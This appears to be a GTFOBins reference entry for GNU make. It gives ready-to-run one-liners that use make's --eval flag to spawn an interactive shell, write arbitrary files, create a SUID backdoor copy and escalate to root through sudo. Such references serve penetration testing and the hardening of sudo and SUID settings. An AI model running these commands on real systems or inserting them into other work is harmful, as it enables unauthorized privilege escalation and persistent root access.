# GTFOBin: make

All these examples only work with GNU `make` due to the lack of support of the `--eval` flag. The same can be achieved by using a proper `Makefile` or by passing the content via stdin using `-f -`.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
COMMAND='/bin/sh'
make -s --eval=$'x:\n\t-'"$COMMAND"
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

Requires a newer GNU `make` version.

```
LFILE=file_to_write
make -s --eval="\$(file >$LFILE,DATA)" .
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which make) .

COMMAND='/bin/sh -p'
./make -s --eval=$'x:\n\t-'"$COMMAND"
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
COMMAND='/bin/sh'
sudo make -s --eval=$'x:\n\t-'"$COMMAND"
```